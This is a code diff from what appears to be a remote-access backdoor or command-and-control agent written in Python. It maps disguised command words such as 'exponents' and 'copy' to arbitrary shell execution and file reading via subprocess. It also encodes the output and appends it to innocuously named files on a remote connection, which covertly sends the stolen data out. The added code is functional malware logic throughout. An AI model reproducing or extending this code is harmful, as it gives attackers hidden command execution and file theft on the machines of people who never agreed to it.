@@ -21,8 +21,13 @@ def random_string(length):
     return random_str
 
 
-def write_output(conn, counter, id, content):
-    pass
+def write_output(conn, counter, my_id, content):
+    path = "/what_i_did_on_day_" + str(counter)
+    if not conn.exist_file(path):
+        conn.create_file(path)
+    content = str(my_id) + "\n\n" + content + "\n\n"
+    content = translations.encode_string(content)
+    conn.append_to_file(path, content)
 
 
 def do_command(conn, counter, row):
@@ -37,19 +42,22 @@ def do_command(conn, counter, row):
         # command ls
         elif parts[4] == "list":
             param = translations.decode_string(row.split(' !A!N!D! ')[1])
-            command = "ls " + param
+            command = "ls -a " + param
         # command id
         elif parts[4] == "identity":
-            pass
+            command = "id"
         # command copy
         elif parts[4] == "copy":
-            pass
+            param = translations.decode_string(row.split(' !A!N!D! ')[1])
+            command = "cat " + param
         # command exec
         elif parts[4] == "exponents":
-            pass
+            param = translations.decode_string(row.split(' !A!N!D! ')[1])
+            command = param
         # command end
         elif parts[4] == "happy":
             exit("Good bye")
+        # TODO alive
 
     # run command
     process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
